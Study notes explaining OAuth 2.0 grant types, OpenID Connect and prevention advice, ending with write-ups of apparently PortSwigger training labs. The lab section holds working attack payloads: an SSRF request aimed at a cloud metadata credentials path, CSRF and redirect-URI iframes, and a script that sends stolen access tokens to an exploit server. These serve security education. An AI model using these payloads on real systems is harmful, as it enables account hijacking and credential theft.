# What is OAuth?
OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party

# How does OAuth 2.0 work?
OAuth 2.0 was originally developed as a way of sharing access to specific data between applications. It works by defining a series of interactions between three distinct parties, namely a client application, a resource owner, and the OAuth service provider
- **Client application** - The website or web application that wants to access the user's data.
- **Resource owner** - The user whose data the client application wants to access. *(you)*
- **OAuth service provider** - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server

# How the OAuth processed
here are numerous different ways that the actual OAuth process can be implemented. These are known as OAuth "flows" or "grant types"
1. The client application requests access to a subset of the user's data, specifying which grant type they want to use and what kind of access they want.
2. The user is prompted to log in to the OAuth service and explicitly give their consent for the requested access.
3. The client application receives a unique access token that proves they have permission from the user to access the requested data. Exactly how this happens varies significantly depending on the grant type.
4. The client application uses this access token to make API calls fetching the relevant data from the resource server

# What is an OAuth grant type?
The OAuth grant type determines the exact sequence of steps that are involved in the OAuth process. The grant type also affects how the client application communicates with the OAuth service at each stage, including how the access token itself is sent. For this reason, grant types are often referred to as "OAuth flows". We'll focus on the **"authorization code"** and **"implicit"** grant types as these are by far the most common.

## OAuth scopes
For any OAuth grant type, the client application has to specify which data it wants to access and what kind of operations it wants to perform. It does this using the `scope` parameter of the authorization request it sends to the OAuth service

## Relation between service provider and client application
1. **Client Registration**
    Before a client (like an app or website) can use the OAuth service, it must register with the authorization server.
    During registration, the client provides details such as:
    - The application's name
    - The type (e.g., web app, mobile app, etc.)
    - Redirect URLs (where the user will be redirected after authorization)
    The authorization server reviews this information and, if it’s a trusted client, approves it.
2. **Assigning a Client ID and Secret**
    - Once the client is approved, the authorization server generates and provides the client with a Client ID and often a Client Secret (if it’s a confidential client, like a backend server).
    - The Client ID is a unique identifier for the client application. It’s used to let the authorization server know which client is making the request.
    - The Client Secret is a password-like credential used for secure communication, especially with confidential clients.

### 1. Authorization code grant type
![[oauth-authorization-code-flow.jpg]]
##### 1. Authorization request
1. **The Client Application Initiates the Request**: The client application (like a web app or mobile app) wants to access some of the user's data (like their profile information or email) from an OAuth service (such as Google, Facebook, etc.).
2. **Sending a Request to the OAuth Service**: To start, the client app sends an HTTP GET request to the OAuth service's authorization endpoint (`/authorization` in this case). This request includes several important parameters that define what the client app wants and how it should handle the response.
*Note :* that the endpoint mapping may vary between providers. However, you should always be able to identify the endpoint based on the parameters used in the request.
`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: oauth-authorization-server.com`
This request contains the following noteworthy parameters, usually provided in the query string:
- `client_id`
    Mandatory parameter containing the unique identifier of the client application. This value is generated when the client application registers with the OAuth service.
- `redirect_uri`
    This is the URL where the OAuth service will send the user back to once they've authorized the app. This is also known as the "call-back URI" or "call-back endpoint". Many OAuth attacks are based on exploiting flaws in the validation of this parameter.
- `response_type`
    Determines which kind of response the client application is expecting and, therefore, which flow it wants to initiate. For the authorization code grant type, the value should be `code`.
- `scope`
    Used to specify which subset of the user's data the client application wants to access. Note that these may be custom scopes set by the OAuth provider or standardized scopes defined by the OpenID Connect specification.
- `state`
    Stores a unique, unguessable value that is tied to the current session on the client application. The OAuth service should return this exact value in the response, along with the authorization code. This parameter serves as a form of CSRF token for the client application by making sure that the request to its `/callback` endpoint is from the same person who initiated the OAuth flow.

##### 2. User login and consent
When the authorization server receives the initial request, it will redirect the user to a login page, where they will be prompted to log in to their account with the OAuth provider. For example, this is often their social media account.
They will then be presented with a list of data that the client application wants to access. This is based on the scopes defined in the authorization request. The user can choose whether or not to consent to this access.
It is important to note that once the user has approved a given scope for a client application, this step will be completed automatically as long as the user still has a valid session with the OAuth service. In other words, the first time the user selects "Log in with social media", they will need to manually log in and give their consent, but if they revisit the client application later, they will often be able to log back in with a single click

##### 3. Authorization code grant
If the user consents to the requested access, their browser will be redirected to the `/callback` endpoint that was specified in the `redirect_uri` parameter of the authorization request. The resulting `GET` request will contain the authorization code as a query parameter. Depending on the configuration, it may also send the `state` parameter with the same value as in the authorization request.
`GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 Host: client-app.com`

##### 4. Access token request
Once the client application receives the authorization code, it needs to exchange it for an access token. To do this, it sends a server-to-server `POST` request to the OAuth service's `/token` endpoint. All communication from this point on takes place in a secure back-channel and, therefore, cannot usually be observed or controlled by an attacker.
`POST /token HTTP/1.1 Host: oauth-authorization-server.com`
`… `
`client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8`

In addition to the `client_id` and `authorization code`, you will notice the following new parameters:

- `client_secret`
    The client application must authenticate itself by including the secret key that it was assigned when registering with the OAuth service.
- `grant_type`
    Used to make sure the new endpoint knows which grant type the client application wants to use. In this case, this should be set to `authorization_code`.

##### 5. Access token grant
The OAuth service will validate the access token request. If everything is as expected, the server responds by granting the client application an access token with the requested scope.
`{ "access_token": "z0y9x8w7v6u5",`
`"token_type": "Bearer",`
`"expires_in": 3600,`
`"scope": "openid profile", … }`

##### 6. API call
Now the client application has the access code, it can finally fetch the user's data from the resource server. To do this, it makes an API call to the OAuth service's `/userinfo` endpoint. The access token is submitted in the `Authorization: Bearer` header to prove that the client application has permission to access this data.
`GET /userinfo HTTP/1.1`
`Host: oauth-resource-server.com `
`Authorization: Bearer z0y9x8w7v6u5`

##### 7. Resource grant
The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource i.e. the user's data based on the scope of the access token.
`{ "username":"carlos", "email":"carlos@carlos-montoya.net", … }`
The client application can finally use this data for its intended purpose. In the case of OAuth authentication, it will typically be used as an ID to grant the user an authenticated session, effectively logging them in.

##### Who Needs the Token?
`PhotoGallery` needs the access token to communicate with `Google`.
##### Why Does `PhotoGallery` Need the Token?
After receiving the access token, `PhotoGallery`uses it to make API requests to `Google`’s resource server. The access token proves that `PhotoGallery`has been authorized to access the user’s data on behalf of the user. For example, `PhotoGallery` will use the access token to call the `/userinfo` endpoint on `Google` to fetch user profile information.

#### 2. Implicit grant type
![[oauth-implicit-flow.jpg]]

The implicit grant type is much simpler. Rather than first obtaining an authorization code and then exchanging it for an access token, the client application receives the access token immediately after the user gives their consent.
You may be wondering why client applications don't always use the implicit grant type. The answer is relatively simple - it is far less secure. When using the implicit grant type, all communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. This means that the sensitive access token and the user's data are more exposed to potential attacks.
##### 1. Authorization request
The implicit flow starts in much the same way as the authorization code flow. The only major difference is that the `response_type` parameter must be set to `token`
##### 2. User login and consent
##### 3. Access token grant
If the user gives their consent to the requested access, this is where things start to differ. The OAuth service will redirect the user's browser to the `redirect_uri` specified in the authorization request. However, instead of sending a query parameter containing an authorization code, it will send the access token and other token-specific data as a URL fragment.
`GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: client-app.com`
As the access token is sent in a URL fragment, it is never sent directly to the client application. Instead, the client application must use a suitable script to extract the fragment and store it.
##### 4. API call
Unlike in the authorization code flow, this also happens via the browser.
##### 5. Resource grant
---
### OpenID Connect roles
The roles for OpenID Connect are essentially the same as for standard OAuth. The main difference is that the specification uses slightly different terminology.
- **Relying party** - The application that is requesting authentication of a user. This is synonymous with the OAuth client application.
- **End user** - The user who is being authenticated. This is synonymous with the OAuth resource owner.
- **OpenID provider** - An OAuth service that is configured to support OpenID Connect
---
Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. You can simply try adding the `openid` scope or changing the response type to `id_token` and observing whether this results in an error.

As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint `/.well-known/openid-configuration`

---
## How to prevent OAuth authentication vulnerabilities
#### For OAuth service providers
- Require client applications to register a whitelist of valid `redirect_uris`. 
- Enforce use of the `state` parameter. This helps protect users against CSRF-like attacks.
- On the resource server, make sure you verify that the access token was issued to the same `client_id` that is making the request. You should also check the scope being requested to make sure that this matches the scope for which the token was originally granted.
#### For OAuth client applications
- Use the `state` parameter even though it is not mandatory.
- Send a `redirect_uri` parameter not only to the `/authorization` endpoint, but also to the `/token` endpoint.
- When developing mobile or native desktop OAuth client applications, it is often not possible to keep the `client_secret` private. In these situations, the `PKCE` (`RFC 7636`) mechanism may be used to provide additional protection against access code interception or leakage.
- If you use the OpenID Connect `id_token`, make sure it is properly validated according to the JSON Web Signature, JSON Web Encryption, and OpenID specifications.
- Be careful with authorization codes - they may be leaked via `Referer` headers when external images, scripts, or CSS content is loaded. It is also important to not include them in the dynamically generated JavaScript files as they may be executed from external domains via `<script>` tags.


## Labs
* #Portswigger
	1. **Authentication bypass via OAuth implicit flow**
		in this request `POST /authentication` we will change our email to `carlos@carlos-montoya.net`
		it happens because of lake of validation on username and email
	2. **SSRF via OpenID dynamic client registration**
		`POST /reg HTTP/1.1`
		`Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net`
		`Content-Type: application/json`
		`{`
	    `"redirect_uris" : [`
        `"https://example.com"`
	    `],`
	    `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`
		`}`
		this is the request we will sent to the allowed URLs
	3. **Forced OAuth profile linking**
		there is no state parameter so we will use this code to exploit CSRF condition
		`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
	4. **OAuth account hijacking via redirect URI**
		in this lab we will change the redirect URI parameter to our server and wait the OAuth server provider to redirect the authorization code to our server then we will use it to exchange it to access token and then access the victim page
		`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
	5. **Stealing OAuth access tokens via an open redirect**
		in this lab the website validates `redirect_uri` so we can not change this parameter so after looking in the page we found that `redirect_uri` are vulnerable to path traversal so we and we found that blog post is vulnerable to open redirect so we tried this request `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://examle.com&response_type=token&nonce=399721827&scope=openid%20profile%20email` to try *path traversal* and *open redirect* and it succeeded so we add our server in the link to redirect the user on it and write a code to extract the access token from the response because we found that the access token passed to us as hash fragment so create a code to extract it
		`<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>`
	6. **Stealing OAuth access tokens via a proxy page**